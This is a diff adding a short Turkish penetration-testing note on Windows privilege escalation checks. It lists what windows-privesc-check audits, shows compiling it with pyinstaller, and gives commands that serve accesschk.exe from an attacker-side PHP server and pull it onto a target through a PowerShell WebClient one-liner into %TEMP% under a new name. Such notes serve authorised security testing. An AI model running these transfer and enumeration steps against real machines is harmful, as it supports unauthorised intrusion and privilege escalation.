@@ -1,0 +1,26 @@
+# Windows Privesc-Check
+
+https://github.com/pentestmonkey/windows-privesc-check
+
+Yüklü uygulama bilgileri
+Paylaşımlar
+Otomatk oturum açma (autologon) olayları
+Zayıf yetkilendirilmiş servisler
+Zayıf yetkilendirilmiş olay günlüğü
+Zayıf yetkilendirilmiş sürücüler
+Zayıf yetkilendirilmiş kayıt değerleri
+Zamanlanmış görevler
+Sıkılaştırma kontrolleri
+
+Python Derleme
+pyinstaller –onedir –onefile .\windows_privesc_check.py –name=”YetkiYukseltme”
+
+YetkiYukseltme.exe –audit -a -o Sonuc.html
+
+# Accesschk.exe Aracı ile Servis Yapılandırma Zafiyet Testi
+
+wget https://live.sysinternals.com/accesschk.exe
+
+php -S 0.0.0.0:8443
+
+Get File : powershell -c “(New-Object System.Net.WebClient).DownloadFile(‘http://X.X.X.X:8443/accesschk.exe’,’%TEMP%\KayDosya.exe’)”
